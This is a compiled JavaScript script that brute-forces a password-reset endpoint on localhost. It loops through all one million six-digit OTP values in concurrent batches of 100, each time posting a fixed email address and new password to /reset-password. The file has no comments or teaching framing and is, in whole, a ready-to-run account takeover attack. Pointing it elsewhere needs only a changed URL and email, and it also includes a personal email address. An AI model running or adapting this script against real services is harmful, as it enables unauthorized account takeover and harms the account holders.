"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
async function sendRequest(otp) {
    let data = JSON.stringify({
        "email": "omsureja@gmail.com",
        "otp": otp,
        "newPassword": "123123123"
    });
    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };
    try {
        await axios_1.default.request(config);
        console.log("done for " + otp);
    }
    catch (e) {
        console.error(`Error for OTP ${otp}:`);
    }
}
async function main() {
    for (let i = 0; i <= 999999; i += 100) {
        const promises = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest((i + j).toString()));
        }
        await Promise.all(promises);
    }
}
main();
